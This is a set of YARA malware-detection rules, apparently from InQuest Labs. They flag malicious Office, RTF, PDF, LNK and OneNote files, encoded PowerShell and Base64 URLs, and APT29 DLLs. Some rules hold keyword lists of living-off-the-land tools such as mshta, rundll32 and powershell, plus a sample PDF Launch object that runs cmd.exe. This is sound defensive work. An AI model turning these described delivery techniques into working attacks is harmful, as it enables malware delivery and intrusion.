rule Adobe_Type_1_Font
{
    meta:
        author         = "InQuest Labs"
        description    = "This signature detects an Adobe Type 1 Font. The Type 1 Font Format is a standardized font format for digital imaging applications."
        created_date   = "2022-03-15"
        updated_date   = "2022-03-15"
        blog_reference = "https://www.iso.org/standard/54796.html"
        labs_reference = "N/A"
        labs_pivot     = "N/A"
        samples        = "64f2c43f3d01eae65125024797d5a40d2fdc9c825c7043f928814b85cd8201a2"

	strings:
	        $pdf = "%PDF-"
	        $magic_classic = "%!FontType1-1."
            $magic_next_generation1 = /obj\s*<<[^>]*\/Type\s*\/Font[^>]*\/Subtype\s*\/Type1/
            $magic_next_generation2 = /obj\s*<<[^>]*\/Subtype\s*\/Type1[^>]*\/Type\s*\/Font/
	condition:
			$magic_classic in (0..1024) or ($pdf in (0..1024) and any of ($magic_next_generation*))
}rule Adobe_XMP_Identifier
{
    meta:
        author         = "InQuest Labs"
		description    = "This signature identifies Adobe Extensible Metadata Platform (XMP) identifiers embedded within files. Defined as a standard for mapping graphical asset relationships, XMP allows for tracking of both parent-child relationships and individual revisions. There are three categories of identifiers: original document, document, and instance. Generally, XMP data is stored in XML format, updated on save/copy, and embedded within the graphical asset. These identifiers can be used to track both malicious and benign graphics within common Microsoft and Adobe document lures."
        created_date   = "2022-03-15"
        updated_date   = "2022-03-15"
        blog_reference = "http://wwwimages.adobe.com/content/dam/acom/en/products/xmp/Pdfs/XMPAssetRelationships.pdf"
        labs_reference = "https://labs.inquest.net/dfi/sha256/1030710f6f18950f01b1a55d50a5169717e48567aa13a0a769f5451423280b4d"
        labs_pivot     = "https://labs.inquest.net/dfi/search/ioc/xmpid/xmp.did%3AEDC9411A6A5F11E2838BB9184F90E845##eyJyZXN1bHRzIjpbIn4iLCJmaXJzdFNlZW4iLDEsIiIsW11dfQ=="
        samples        = "1030710f6f18950f01b1a55d50a5169717e48567aa13a0a769f5451423280b4d"

	strings:
    $xmp_md5  = /xmp\.[dio]id[-: _][a-f0-9]{32}/  nocase ascii wide
    $xmp_guid = /xmp\.[dio]id[-: _][a-f0-9]{36}/ nocase ascii wide
	condition:
			any of them
}
import "pe"

rule apt29_dll_may2022 :  SVR G0016 apt29 NOBELIUM UNC2452 Russia
{
	meta:
        author           = "InQuest Labs"
        description      = "This signature detects .DLL files associated with recent APT29 (Russia, NOBELIUM) activity"
        created_date     = "2022-05-09"
        updated_date     = "2022-05-09"
        sample1          = "6fc54151607a82d5f4fae661ef0b7b0767d325f5935ed6139f8932bc27309202"
        sample2          = "6618a8b55181b1309dc897d57f9c7264e0c07398615a46c2d901dd1aa6b9a6d6"
        sample3          = "6618a8b55181b1309dc897d57f9c7264e0c07398615a46c2d901dd1aa6b9a6d6"
        imphash          = "b4a3f218dbd33872d0fd88a2ff95be76"         
        sample_reference = "https://www.joesandbox.com/analysis/621068/0/html"
        mitre_group      = "https://attack.mitre.org/groups/G0016/"
	strings:
            $a1 = ".mp3" ascii wide nocase
            $a2 = "blank.pdf" ascii wide nocase
            $a3 = "Rock" ascii wide nocase
            $a4 = "vcruntime140.dll" ascii wide nocase

            $b1 = "RcvAddQueuedResolution" ascii wide nocase
            $b2 = "RcvResolution" ascii wide nocase
            $b3 = "AdobeAcroSup" ascii wide nocase
            $b4 = "AcroSup" ascii wide nocase
	condition:
		uint16(0) == 0x5a4d and ((filesize < 800KB) and all of ($a*) and any of ($b*))
}
rule Base64_Encoded_Powershell_Directives
{
    meta:
        author         = "InQuest Labs"
        description    = "This signature detects base64 encoded Powershell directives."
        created_date   = "2022-03-15"
        updated_date   = "2022-03-15"
        blog_reference = "https://inquest.net/blog/2019/07/19/base64-encoded-powershell-pivots"
        labs_reference = "https://labs.inquest.net/dfi/sha256/3b8235b67c4b67ea782b49388c5166786fb9d7a5b5096150b1c10e53f1d01738"
        labs_pivot     = "https://labs.inquest.net/dfi/search/alert/Base64%20Encoded%20Powershell%20Directives"
        samples        = "https://github.com/InQuest/malware-samples/tree/master/2019-07-Base64-Encoded-Powershell-Directives"

    strings:
        // NOTE: these regular expressions were generated via https://labs.inquest.net/tools/yara/b64-regexp-generator

        // Copy-Item
        $enc01 = /(Q\x32\x39weS\x31JdGVt[\x2b\x2f-\x39A-Za-z]|[\x2b\x2f-\x39A-Za-z][\x2b\x2f-\x39A-Za-z][\x31\x35\x39BFJNRVZdhlptx]Db\x33B\x35LUl\x30ZW[\x30-\x33]|[\x2b\x2f-\x39A-Za-z][\x30EUk]NvcHktSXRlb[Q-Za-f])/

        // ForEach-Object
        $enc02 = /(Rm\x39yRWFjaC\x31PYmplY\x33[Q-T]|[\x2b\x2f-\x39A-Za-z][\x2b\x2f-\x39A-Za-z][\x31\x35\x39BFJNRVZdhlptx]Gb\x33JFYWNoLU\x39iamVjd[A-P]|[\x2b\x2f-\x39A-Za-z][\x30EUk]ZvckVhY\x32gtT\x32JqZWN\x30[\x2b\x2f-\x39A-Za-z])/

        // Get-ChildItem
        $enc03 = /(R\x32V\x30LUNoaWxkSXRlb[Q-Za-f]|[\x2b\x2f-\x39A-Za-z][\x2b\x2f-\x39A-Za-z][\x31\x35\x39BFJNRVZdhlptx]HZXQtQ\x32hpbGRJdGVt[\x2b\x2f-\x39A-Za-z]|[\x2b\x2f-\x39A-Za-z][\x30EUk]dldC\x31DaGlsZEl\x30ZW[\x30-\x33])/

        // Get-ItemPropertyValue
        $enc04 = /(R\x32V\x30LUl\x30ZW\x31Qcm\x39wZXJ\x30eVZhbHVl[\x2b\x2f-\x39A-Za-z]|[\x2b\x2f-\x39A-Za-z][\x2b\x2f-\x39A-Za-z][\x31\x35\x39BFJNRVZdhlptx]HZXQtSXRlbVByb\x33BlcnR\x35VmFsdW[U-X]|[\x2b\x2f-\x39A-Za-z][\x30EUk]dldC\x31JdGVtUHJvcGVydHlWYWx\x31Z[Q-Za-f])/

        // Get-Random
        $enc05 = /(R\x32V\x30LVJhbmRvb[Q-Za-f]|[\x2b\x2f-\x39A-Za-z][\x2b\x2f-\x39A-Za-z][\x31\x35\x39BFJNRVZdhlptx]HZXQtUmFuZG\x39t[\x2b\x2f-\x39A-Za-z]|[\x2b\x2f-\x39A-Za-z][\x30EUk]dldC\x31SYW\x35kb\x32[\x30-\x33])/

        // Join-Path
        $enc06 = /(Sm\x39pbi\x31QYXRo[\x2b\x2f-\x39A-Za-z]|[\x2b\x2f-\x39A-Za-z][\x2b\x2f-\x39A-Za-z][\x31\x35\x39BFJNRVZdhlptx]Kb\x32luLVBhdG[g-j]|[\x2b\x2f-\x39A-Za-z][\x30EUk]pvaW\x34tUGF\x30a[A-P])/

        // Move-Item
        $enc07 = /(TW\x39\x32ZS\x31JdGVt[\x2b\x2f-\x39A-Za-z]|[\x2b\x2f-\x39A-Za-z][\x2b\x2f-\x39A-Za-z][\x31\x35\x39BFJNRVZdhlptx]Nb\x33ZlLUl\x30ZW[\x30-\x33]|[\x2b\x2f-\x39A-Za-z][\x30EUk]\x31vdmUtSXRlb[Q-Za-f])/

        // New-Item
        $enc08 = /(TmV\x33LUl\x30ZW[\x30-\x33]|[\x2b\x2f-\x39A-Za-z][\x2b\x2f-\x39A-Za-z][\x31\x35\x39BFJNRVZdhlptx]OZXctSXRlb[Q-Za-f]|[\x2b\x2f-\x39A-Za-z][\x30EUk]\x35ldy\x31JdGVt[\x2b\x2f-\x39A-Za-z])/

        // New-Object
        $enc09 = /(TmV\x33LU\x39iamVjd[A-P]|[\x2b\x2f-\x39A-Za-z][\x2b\x2f-\x39A-Za-z][\x31\x35\x39BFJNRVZdhlptx]OZXctT\x32JqZWN\x30[\x2b\x2f-\x39A-Za-z]|[\x2b\x2f-\x39A-Za-z][\x30EUk]\x35ldy\x31PYmplY\x33[Q-T])/

        // Out-String
        $enc10 = /(T\x33V\x30LVN\x30cmluZ[\x2b\x2f-\x39w-z]|[\x2b\x2f-\x39A-Za-z][\x2b\x2f-\x39A-Za-z][\x31\x35\x39BFJNRVZdhlptx]PdXQtU\x33RyaW\x35n[\x2b\x2f-\x39A-Za-z]|[\x2b\x2f-\x39A-Za-z][\x30EUk]\x39\x31dC\x31TdHJpbm[c-f])/

        // Remove-Item
        $enc11 = /(UmVtb\x33ZlLUl\x30ZW[\x30-\x33]|[\x2b\x2f-\x39A-Za-z][\x2b\x2f-\x39A-Za-z][\x31\x35\x39BFJNRVZdhlptx]SZW\x31vdmUtSXRlb[Q-Za-f]|[\x2b\x2f-\x39A-Za-z][\x31FVl]JlbW\x39\x32ZS\x31JdGVt[\x2b\x2f-\x39A-Za-z])/

        // Select-Object
        $enc12 = /(U\x32VsZWN\x30LU\x39iamVjd[A-P]|[\x2b\x2f-\x39A-Za-z][\x2b\x2f-\x39A-Za-z][\x31\x35\x39BFJNRVZdhlptx]TZWxlY\x33QtT\x32JqZWN\x30[\x2b\x2f-\x39A-Za-z]|[\x2b\x2f-\x39A-Za-z][\x31FVl]NlbGVjdC\x31PYmplY\x33[Q-T])/

        // Sort-Object
        $enc13 = /(U\x32\x39ydC\x31PYmplY\x33[Q-T]|[\x2b\x2f-\x39A-Za-z][\x2b\x2f-\x39A-Za-z][\x31\x35\x39BFJNRVZdhlptx]Tb\x33J\x30LU\x39iamVjd[A-P]|[\x2b\x2f-\x39A-Za-z][\x31FVl]NvcnQtT\x32JqZWN\x30[\x2b\x2f-\x39A-Za-z])/

        // Split-Path
        $enc14 = /(U\x33BsaXQtUGF\x30a[A-P]|[\x2b\x2f-\x39A-Za-z][\x2b\x2f-\x39A-Za-z][\x31\x35\x39BFJNRVZdhlptx]TcGxpdC\x31QYXRo[\x2b\x2f-\x39A-Za-z]|[\x2b\x2f-\x39A-Za-z][\x31FVl]NwbGl\x30LVBhdG[g-j])/

        // Test-Path
        $enc15 = /(VGVzdC\x31QYXRo[\x2b\x2f-\x39A-Za-z]|[\x2b\x2f-\x39A-Za-z][\x2b\x2f-\x39A-Za-z][\x31\x35\x39BFJNRVZdhlptx]UZXN\x30LVBhdG[g-j]|[\x2b\x2f-\x39A-Za-z][\x31FVl]Rlc\x33QtUGF\x30a[A-P])/

        // Write-Host
        $enc16 = /(V\x33JpdGUtSG\x39zd[A-P]|[\x2b\x2f-\x39A-Za-z][\x2b\x2f-\x39A-Za-z][\x31\x35\x39BFJNRVZdhlptx]Xcml\x30ZS\x31Ib\x33N\x30[\x2b\x2f-\x39A-Za-z]|[\x2b\x2f-\x39A-Za-z][\x31FVl]dyaXRlLUhvc\x33[Q-T])/

        // [Convert]::FromBase64String
        $enc17 = /([\x2b\x2f-\x39A-Za-z][\x2b\x2f-\x39A-Za-z][\x31\x35\x39BFJNRVZdhlptx][\x30\x32Dlu-vy][O]jpGcm\x39tQmFzZTY\x30U\x33RyaW\x35n[\x2b\x2f-\x39A-Za-z]|[\x2b\x2f-\x39A-Za-z][\x30\x32-\x33EG-HUW-Xkm-n][\x34\x38IMQUY]\x36OkZyb\x32\x31CYXNlNjRTdHJpbm[c-f]|[QZb-d][DTjz]o\x36RnJvbUJhc\x32U\x32NFN\x30cmluZ[\x2b\x2f-\x39w-z])/

    condition:
            any of ($enc*)
}
rule Base64_Encoded_URL
{
    meta:
        author         = "InQuest Labs"
        description    = "This signature fires on the presence of Base64 encoded URI prefixes (http:// and https://) across any file. The simple presence of such strings is not inherently an indicator of malicious content, but is worth further investigation."
        created_date   = "2022-03-15"
        updated_date   = "2022-03-15"
        blog_reference = "InQuest Labs R&D"
        labs_reference = "https://labs.inquest.net/dfi/sha256/114366bb4ef0f3414fb1309038bc645a7ab2ba006ef7dc2abffc541fcc0bb687"
        labs_pivot     = "https://labs.inquest.net/dfi/search/alert/Base64%20Encoded%20URL"
        samples        = "114366bb4ef0f3414fb1309038bc645a7ab2ba006ef7dc2abffc541fcc0bb687"

	strings:
			$httpn  = /(aHR\x30cDovL[\x2b\x2f-\x39w-z]|[\x2b\x2f-\x39A-Za-z][\x2b\x2f-\x39A-Za-z][\x31\x35\x39BFJNRVZdhlptx]odHRwOi\x38v[\x2b\x2f-\x39A-Za-z]|[\x2b\x2f-\x39A-Za-z][\x32GWm]h\x30dHA\x36Ly[\x2b\x2f\x38-\x39])/
	$httpw  = /(aAB\x30AHQAcAA\x36AC\x38AL[\x2b\x2f-\x39w-z]|[\x2b\x2f-\x39A-Za-z][\x2b\x2f-\x39A-Za-z][\x31\x35\x39BFJNRVZdhlptx]oAHQAdABwADoALwAv[\x2b\x2f-\x39A-Za-z]|[\x2b\x2f-\x39A-Za-z][\x32GWm]gAdAB\x30AHAAOgAvAC[\x2b\x2f\x38-\x39])/
	$httpsn = /(aHR\x30cHM\x36Ly[\x2b\x2f\x38-\x39]|[\x2b\x2f-\x39A-Za-z][\x2b\x2f-\x39A-Za-z][\x31\x35\x39BFJNRVZdhlptx]odHRwczovL[\x2b\x2f-\x39w-z]|[\x2b\x2f-\x39A-Za-z][\x32GWm]h\x30dHBzOi\x38v[\x2b\x2f-\x39A-Za-z])/
    $httpsw = /(aAB\x30AHQAcABzADoALwAv[\x2b\x2f-\x39A-Za-z]|[\x2b\x2f-\x39A-Za-z][\x2b\x2f-\x39A-Za-z][\x31\x35\x39BFJNRVZdhlptx]oAHQAdABwAHMAOgAvAC[\x2b\x2f\x38-\x39]|[\x2b\x2f-\x39A-Za-z][\x32GWm]gAdAB\x30AHAAcwA\x36AC\x38AL[\x2b\x2f-\x39w-z])/
	condition:
			any of them and not (uint16be(0x0) == 0x4d5a)
}rule Controlword_Whitespace_RTF
{
    meta:
        author         = "InQuest Labs"
        description    = "This rule detects multiple instances of whitespace characters in the OBJDATA control word in an RTF document."
        created_date   = "2022-03-15"
        updated_date   = "2022-03-15"
        blog_reference = "InQuest Internal Research"
        labs_reference = "N/A"
        labs_pivot     = "N/A"
        samples        = "c4754d2d7e02c50de6e0551d6b0567ec3c48d6ae45d9e62ad62d544f66cf131c"

    strings:
		$rtf_magic = "{\\rt"  // note that {\rtf1 is not required

		$re1 = /\x7b[^\x7d]*\\objdata[ \t\r\n]+[a-f0-9\x2e\x2d\r\n\x5c]{0,100}[ \t\r\n]{9,}[a-f0-9\x2e\x2d\r\n\x5c]{0,100}[ \t\r\n]{6,}[a-f0-9\x2e\x2d\r\n\x5c]{0,100}[ \t\r\n]{6}/ nocase wide ascii
		//$re1 is looking within \objdata controll word for at least two instances of whitespace characters (9 or more and 6 or more) in between the contents
	condition:
			
		$rtf_magic in (0..30) and all of ($re*)

}
rule CVE_2014_1761
{
    meta:
        author         = "InQuest Labs"
        description    = "This signature detects a specially crafted RTF file that is designed to trigger a memory corruption vulnerability in the RTF parsing code that would allow an attacker to execute arbitrary code. The successful exploitation of this vulnerability gains the same user rights as the current user."
        created_date   = "2022-03-15"
        updated_date   = "2022-03-15"
        blog_reference = "http://technet.microsoft.com/en-us/security/advisory/2953095"
        labs_reference = "N/A"
        labs_pivot     = "https://labs.inquest.net/dfi/sha256/db0037a9753c364022af4bb7d578996b78ccc3c28b01c6632ccd95a69d49d67c"
        samples        = "db0037a9753c364022af4bb7d578996b78ccc3c28b01c6632ccd95a69d49d67c"

	strings:
			
		$magic = { 7B 5C 72 74 }
		$author = { 5C 61 75 74 68 6F 72 20 69 73 6D 61 69 6C 20 2D 20 5B 32 30 31 30 5D } /* \author ismail - [2010] */
		$operator = { 5C 6F 70 65 72 61 74 6F 72 20 69 73 6D 61 69 6C 20 2D 20 5B 32 30 31 30 5D } /* \operator ismail - [2010] */
	condition:
			
		$magic at 0 and $author or $operator in (0..1024)

}rule Encrypted_Office_Document
{
    meta:
        author         = "InQuest Labs"
		description    = "This signature detects an office document that has been encrypted or password protected. Attackers use the password feature to encrypt files, making it difficult for security products to detect them as malware."
        created_date   = "2022-03-15"
        updated_date   = "2022-03-15"
        blog_reference = "https://www.symantec.com/connect/blogs/malicious-password-protected-documents-used-targeted-attacks"
        labs_reference = "https://labs.inquest.net/dfi/sha256/8a89a5c5dc79d4f8b8dd5007746ae36a3b005d84123b6bbc7c38637f43705023"
        labs_pivot     = "N/A"
        samples        = "8a89a5c5dc79d4f8b8dd5007746ae36a3b005d84123b6bbc7c38637f43705023"

	strings:
	    $a = {04 00 00 00 00 00 00 00 01 68 00 00 04 80 00 00 (80|28) 00 00 00 01 00 00 00 ?? ?? ?? ?? 00 00 00 00 4D 00 69 00 63 00 72 00 6F 00 73 00 6F 00 66 00 74 00 20 00 }
        $b = "EncryptedPackage" wide
        $magic = { D0 CF 11 E0 A1 B1 1A E1 00 00 00 }
	condition:
	    $a or ($magic in (0..1024) and $b)
}rule EPPlus_OOXML_Document
{
    meta:
        author         = "InQuest Labs"
        description    = "This signature detects Documents created with EPPlus software that has been observed being abused by threat actors to deliver malicious payloads.  These documents are being built without using the Microsoft Office suite of tools and have active VBA code within the document, which makes them interesting.  These files are not malicious by nature but rather another tool abused for nefarious purposes."
        created_date   = "2022-03-15"
        updated_date   = "2022-03-15"
        blog_reference = "https://blog.nviso.eu/2020/09/01/epic-manchego-atypical-maldoc-delivery-brings-flurry-of-infostealers/"
        labs_reference = "https://labs.inquest.net/dfi/sha256/f4bd263fa5a0ab82ea20fe6789f2e514a4644dc24fcc4c22af05266d0574c675"
        labs_pivot     = "N/A"
        samples        = "f4bd263fa5a0ab82ea20fe6789f2e514a4644dc24fcc4c22af05266d0574c675"

	strings:
		$opc = "[Content_Types].xml"
        $ooxml = "xl/workbook.xml"
        $vba = "xl/vbaProject.bin"
        $meta1 = "docProps/core.xml"
        $meta2 = "docProps/app.xml"
        $timestamp = {50 4B 03 04 ?? ?? ?? ?? ?? ?? 00 00 21 00}
	condition:
		uint32be(0) == 0x504B0304 
        and ($opc and $ooxml and $vba)
        and not (any of ($meta*) and $timestamp)
}rule Hex_Encoded_Link_in_RTF
{
    meta:
        author         = "InQuest Labs"
        description    = "This signature detects Office documents with a link to download an executable which has been encoded in ASCII hexadecimal form. Malware authors have used this technique to obfuscate malicious payloads."
        created_date   = "2022-03-15"
        updated_date   = "2022-03-15"
        blog_reference = "https://isc.sans.edu/diary/Getting+the+EXE+out+of+the+RTF/6703"
        labs_reference = "N/A"
        labs_pivot     = "N/A"
        samples        = "N/A"

	strings:
			
        $m = {7b 5c 72 74 66 31} // RTF
        $a1 = "687474703a2f2f"
        $a2 = "2e657865"
	condition:
			
        $m and all of ($a*)

}rule JS_PDF_Data_Submission
{
    meta:
        author         = "InQuest Labs"
        description    = "This signature detects pdf files with http data submission forms. Severity will be 0 unless paired with Single Page PDF rule."
        created_date   = "2022-03-15"
        updated_date   = "2022-03-15"
        blog_reference = "InQuest Labs Empirical Observations"
        labs_reference = "N/A"
        labs_pivot     = "N/A"
        samples        = "a0adbe66e11bdeaf880b81b41cd63964084084a413069389364c98da0c4d2a13"

	strings:
			
        $pdf_header = "%PDF-"
        $js = /(\/JS|\/JavaScript)/ nocase
        $a1 = /app\s*\.\s*doc\s*\.\s*submitForm\s*\(\s*['"]http/ nocase
        $inq_tail = "INQUEST-PP=pdfparser"
	condition:		
        ($pdf_header in (0..1024) or $inq_tail in (filesize-30..filesize))
            and
        $js and $a1

}rule Microsoft_2007_OLE_Encrypted
{
    meta:
        author         = "InQuest Labs"
        description    = "This signature detects Microsoft OLE documents, version 2007 and above, that are encrypted with a password. An encrypted OLE document alone is not indication of malicious behavior."
        created_date   = "2022-03-15"
        updated_date   = "2022-03-15"
        blog_reference = "https://www.iso.org/standard/54796.html"
        labs_reference = "N/A"
        labs_pivot     = "N/A"
        samples        = "64f2c43f3d01eae65125024797d5a40d2fdc9c825c7043f928814b85cd8201a2"

	strings:
		$ole_marker     = /^\xD0\xCF\x11\xE0\xA1\xB1\x1A\xE1/
        
        $enc_marker1    = "EncryptedPackage" nocase ascii wide
        $enc_marker2    = "StrongEncryptionDataSpace" nocase ascii wide
        $enc_marker3    = "<encryption xmlns="
	condition:
			$ole_marker at 0 and all of ($enc_marker*)
}rule Microsoft_Excel_Hidden_Macrosheet
{
    meta:
        author         = "InQuest Labs"
        description    = "This signature detects Microsoft Excel spreadsheets that contain hidden sheets. Presence of a hidden sheet alone is not indication of malicious behavior."
        created_date   = "2022-03-15"
        updated_date   = "2022-03-15"
        blog_reference = "https://support.office.com/en-us/article/hide-or-show-worksheets-or-workbooks-69f2701a-21f5-4186-87d7-341a8cf53344"
        labs_reference = "https://labs.inquest.net/dfi/sha256/127c67df5629ff69f67328d0c5c92c606ac7caebf6106aaee8364a982711c120"
        labs_pivot     = "https://labs.inquest.net/dfi/search/alert/Excel%20Macro%20Manipulates%20Hidden%20Sheets"
        samples        = "127c67df5629ff69f67328d0c5c92c606ac7caebf6106aaee8364a982711c120"

	strings:
			$ole_marker     = {D0 CF 11 E0 A1 B1 1A E1}
    $macro_sheet_h1 = {85 00 ?? ?? ?? ?? ?? ?? 01 01}
    $macro_sheet_h2 = {85 00 ?? ?? ?? ?? ?? ?? 02 01}
    $hidden_xlsx_01 = /hidden\s*=\s*["'][12]["']/ nocase
    $hidden_xlsx_02 = /state\s*=\s*["'](very)?Hidden["']/ nocase
	condition:
			($ole_marker at 0 and 1 of ($macro_sheet_h*))
    or
	 any of ($hidden_xlsx*)
}
rule Microsoft_Excel_with_Macrosheet
{
    meta:
        author         = "InQuest Labs"
        description    = "This signature detects Microsoft Excel spreadsheets that contain macrosheets."
        created_date   = "2022-03-15"
        updated_date   = "2022-03-15"
        blog_reference = "https://inquest.net/blog/2020/03/18/Getting-Sneakier-Hidden-Sheets-Data-Connections-and-XLM-Macros"
        labs_reference = "https://labs.inquest.net/dfi/sha256/00c7f1ca11df632695ede042420e4a73aa816388320bf5ac91df542750f5487e"
        labs_pivot     = "https://labs.inquest.net/dfi/search/alert/Autostarting%20Excel%20Macro%20Sheet"
        samples        = "00c7f1ca11df632695ede042420e4a73aa816388320bf5ac91df542750f5487e"

	strings:
			$magic1 = /^\xD0\xCF\x11\xE0\xA1\xB1\x1A\xE1\x00\x00\x00/
	$xls_stub = {09 08 10 00 00 06 05 00}
    $olemacrosheet = /(\x85\x00.{6,7}[\x01\x02]|Excel 4.0 Macros)/
    $xlsxmacrosheet = /Type\s*=\s*['"]https?:\/\/schemas.microsoft.com\/office\/20\d\d\/relationships\/xlMacrosheet['"]/ nocase
	condition:
			(($magic1 at 0 and $xls_stub) and $olemacrosheet)
    or
    ($xlsxmacrosheet)
}rule Microsoft_LNK_with_CMD_EXE_Reference
{
    meta:
        Author = "InQuest Labs"
        Description = "This rule detects Microsoft Windows LNK shortcut files that reference the cmd.exe command interpreter. While not necessarily indicative of malicious behavior, this is a common pivot leveraged by a variety of malware campaigns."
        Creation_Date = "2017-11-22"
        Updated_Date = "2022-06-17"
        blog_reference = "N/A"
        labs_reference = "N/A"
        labs_pivot     = "N/A"
        samples        = "15651b4516dc207148ad6d2cf098edc766dc06fc26c79d498305ddcb7c930eab"
    strings:
    $c1 = "\\Windows\\System32\\cmd.exe" nocase ascii wide
    
    $s1 = /cmd.exe[ \t]+\x2f[a-z][ \t]/ ascii wide nocase
    $s2 = { 00 25 00 53 00 79 00 73 00 74 00 65 00 6D 00 52
    00 6F 00 6F 00 74 00 25 00 5C 00 53 00 79 00 73
    00 74 00 65 00 6D 00 33 00 32 00 EF 01 2F 00 43
    00 20 00 22 00 63 00 6D 00 64 00 2E 00 65 00 78
    00 65 }
    $s3 = "%comspec%" ascii wide nocase fullword
    
    condition:
            ( uint32(0) == 0x0000004c and filesize < 4KB and $c1 and 1 of ($s*) )
}
rule Microsoft_LNK_with_PowerShell_Shortcut_References
{
    meta:
        Author = "InQuest Labs"
        Description = "This signature detects LNK files that have PowerShell shortcut commands being reference. Seeing this type of activity within an LNK file is suspect and should be reviewed. .LNK based file retrieval and code execution have seen an uptick in multi-stage email attacks with Microsoft making changes affecting access to common document macro based vectors. Windows shortcuts with the .lnk extension have become a more favorable delivery method as a result."
        Creation_Date = "2022-06-17"
        Updated_Date = "2022-07-08"
        blog_reference = "InQuest Labs Empirical Observations"
        labs_reference = "N/A"
        labs_pivot     = "N/A"
        samples        = "15651b4516dc207148ad6d2cf098edc766dc06fc26c79d498305ddcb7c930eab"
    strings:
    $hex_6bf = { 24 00 50 00 31 00 }
    condition:
        (uint32be(0x0) == 0x4c000000 and uint32be(0x4) == 0x1140200)
        and $hex_6bf          
}
rule Microsoft_LNK_with_WMI
{
    meta:
        Author = "InQuest Labs"
        Description = "This signature detects Microsoft LNK (Shortcut) files that contain a URL and reference WMI that can be used to download and execute a payload. These files are often used by malicious actors as a malware delivery vector."
        Creation_Date = "2020-05-15"
        Updated_Date = "2020-05-20"
        blog_reference = "https://blog.prevailion.com/2020/05/phantom-in-command-shell5.html"
        labs_reference = "N/A"
        labs_pivot     = "N/A"
        samples        = "104ba824c47a87601d7c70e4b35cfb1cb609b0905e4e4b67bb8873ce3b5e7c33"
    strings:
        $wmi    = /GetObject[ \t]*\([ \t]*['"][ \t]*winmgmts:[\x5c\x2e]/ nocase wide ascii
    condition:
            (uint32be(0x0) == 0x4c000000 and uint32be(0x4) == 0x1140200) and $wmi
}
rule Microsoft_OneNote_with_Suspicious_String
{
    meta:
        author         = "InQuest Labs"
        description    = "This signature detects Microsoft OneNote files containing suspicious strings."
        created_date   = "2023-02-24"
        updated_date   = "2023-02-24"
        blog_reference = "https://inquest.net/blog/2023/02/27/youve-got-malware-rise-threat-actors-using-microsoft-onenote-malicious-campaigns"
        labs_reference = "N/A"
        labs_pivot     = "N/A"
        samples        = "660870c3f3e8ff105e5cc06b3b3d04436118fc67533c93d0df56bde359e335d0"

    strings:
        $suspicious_00 = "<script" nocase ascii wide
        $suspicious_01 = "cmd.exe" nocase ascii wide
        $suspicious_02 = "CreateObject" nocase ascii wide
        $suspicious_03 = "CreateProcess" nocase ascii wide
        $suspicious_04 = "echo off" nocase ascii wide
        $suspicious_05 = "ExecuteCmdAsync" nocase ascii wide
        $suspicious_06 = "mshta" nocase ascii wide
        $suspicious_07 = "msiexec" nocase ascii wide
        $suspicious_08 = "powershell" nocase ascii wide
        $suspicious_09 = "regsvr32" nocase ascii wide
        $suspicious_10 = "rundll32" nocase ascii wide
        $suspicious_11 = "schtasks" nocase ascii wide
        $suspicious_12 = "SetEnvironmentVariable" nocase ascii wide
        $suspicious_13 = "winmgmts" nocase ascii wide
        $suspicious_14 = "Wscript" nocase ascii wide
        $suspicious_15 = "WshShell" nocase ascii wide
    condition:
        uint32be(0) == 0xE4525C7B and any of ($suspicious*)
}
rule Office_Document_with_VBA_Project
{
    meta:
        author         = "InQuest Labs"
		description    = "This signature detects an office document with an embedded VBA project. While this is fairly common it is sometimes used for malicious intent."
        created_date   = "2022-03-15"
        updated_date   = "2022-03-15"
        blog_reference = "http://msdn.microsoft.com/en-us/library/office/aa201751%28v=office.10%29.aspx"
        labs_reference = "https://labs.inquest.net/dfi/sha256/8a89a5c5dc79d4f8b8dd5007746ae36a3b005d84123b6bbc7c38637f43705023"
        labs_pivot     = "N/A"
        samples        = "8a89a5c5dc79d4f8b8dd5007746ae36a3b005d84123b6bbc7c38637f43705023"

	strings:
			
		$magic1 = /^\xD0\xCF\x11\xE0\xA1\xB1\x1A\xE1\x00\x00\x00/
		$magic2 = /^\x50\x4B\x03\x04\x14\x00\x06\x00/
		$vba_project1 = "VBA_PROJECT" wide nocase
		$vba_project2 = "word/vbaProject.binPK"
	
    condition:
			
		(($magic1 at 0) or ($magic2 at 0)) and any of ($vba_project*)

}rule PDF_Containing_JavaScript
{
    meta:
        author         = "InQuest Labs"
		description    = "This signature detects a PDF file that contains JavaScript. JavaScript can be used to customize PDFs by implementing objects, methods, and properties. While not inherently malicious, embedding JavaScript inside of a PDF is often used for malicious purposes such as malware delivery or exploitation."
        created_date   = "2022-03-15"
        updated_date   = "2022-03-15"
        blog_reference = "www.sans.org/security-resources/malwarefaq/pdf-overview.php"
        labs_reference = "N/A"
        labs_pivot     = "N/A"
        samples        = "c82e29dcaed3c71e05449cb9463f3efb7114ea22b6f45b16e09eae32db9f5bef"

	strings:
			
		$pdf_tag1 = /\x25\x50\x44\x46\x2d/
		$js_tag1  = "/JavaScript" fullword
		$js_tag2  = "/JS"		  fullword
	condition:
			
		$pdf_tag1 in (0..1024) and ($js_tag1 or $js_tag2)

}
rule PDF_Launch_Action_EXE
{
    meta:
        author         = "InQuest Labs"
        description    = "This signature detects PDF files that launch an executable upon being opened on a host machine. This action is performed by the Launch Action feature available in the PDF file format and is commonly abused by threat actors to execute delivered malware."
        created_date   = "2022-03-15"
        updated_date   = "2022-03-15"
        blog_reference = "InQuest Labs Empirical Observations"
        labs_reference = "N/A"
        labs_pivot     = "N/A"
        samples        = "cb5e659c4ac93b335c77c9b389d8ef65d8c20ab8b0ad08e5f850cc5055e564c3"

	strings:
			
        /* 8 0 obj
        <<
        /Type /Action
        /S /Launch
        /Win
        <<
        /F (cmd.exe)
        >>
        >>
        endobj
        
        */
        
        $magic01 = "INQUEST-PP=pdfparser"
        $magic02 = "%PDF"
        
        $re1 = /\x2fType[ \t\r\n]*\x2fAction/ nocase wide ascii       
        $re2 = /obj[^\x3c\x3e]+<<[^\x3e]*\x2fS[ \t\r\n]*\x2fLaunch[^\x3c\x3e]*<<[^\x3e]*\x2fF[ \t\r\n]*\x28[^\x29]+\.exe[^\x29]*\x29/ nocase wide ascii
	condition:
			
        ($magic01 in (filesize-30 .. filesize) or $magic02 in (0 .. 10)) and all of ($re*)

}rule PDF_Launch_Function
{
    meta:
        author         = "InQuest Labs"
		description    = "This signature detects the launch function within a PDF file. This function allows a document author to attach an executable file."
        created_date   = "2022-03-15"
        updated_date   = "2022-03-15"
        blog_reference = "http://blog.trendmicro.com/trendlabs-security-intelligence/PDF-launch-feature-abused-to-carry-zeuszbot/"
        labs_reference = "N/A"
        labs_pivot     = "N/A"
